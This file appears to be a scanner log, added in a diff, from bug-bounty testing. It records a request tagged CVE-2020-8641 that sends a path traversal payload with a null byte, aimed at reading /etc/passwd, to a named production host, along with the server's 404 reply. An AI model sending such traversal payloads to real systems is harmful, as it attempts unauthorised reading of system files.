@@ -1,0 +1,30 @@
+[CVE-2020-8641] Dumped HTTP request for https://techsolutions.bitpanda.com/index.php?page_slug=../../../../../etc/passwd%00
+
+
+GET /index.php?page_slug=../../../../../etc/passwd%00 HTTP/1.1
+Host: techsolutions.bitpanda.com
+User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 14_7_4) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/18.3 Safari/605.1.15
+Connection: close
+Accept: */*
+Accept-Language: en
+X-Bug-Bounty: Bugcrowd-eno@bugcrowdninja.com
+Accept-Encoding: gzip
+
+
+[CVE-2020-8641] Dumped HTTP response https://techsolutions.bitpanda.com/index.php?page_slug=../../../../../etc/passwd%00
+
+HTTP/1.1 404 Not Found
+Connection: close
+Content-Length: 9
+Cache-Control: max-age=30
+Content-Type: text/plain
+Date: Tue, 05 Aug 2025 12:53:23 GMT
+Strict-Transport-Security: max-age=31536000
+Via: 1.1 4d89e7f6870714b602988e2ed1135996.cloudfront.net (CloudFront)
+X-Amz-Cf-Id: CZNqIhKBWiMb9UXdxfD5xmHlpXq_cvZIustBN4iQbncClDkEau7tgA==
+X-Amz-Cf-Pop: IAD55-P8
+X-Amz-Id-2: qw6a3ODbiLH7Qg7HxfoOm4Y3+xgcx5ExHBHA06YqN1HNN+i8wa7FGpld5on0BdB6Hh9tlfywq9ITYeh/VQGO1ODZGpIy3eV1NbWV9KNhdbo=
+X-Amz-Request-Id: 41Z8TNDYXN3B8GB8
+X-Cache: Error from cloudfront
+
+Not Found
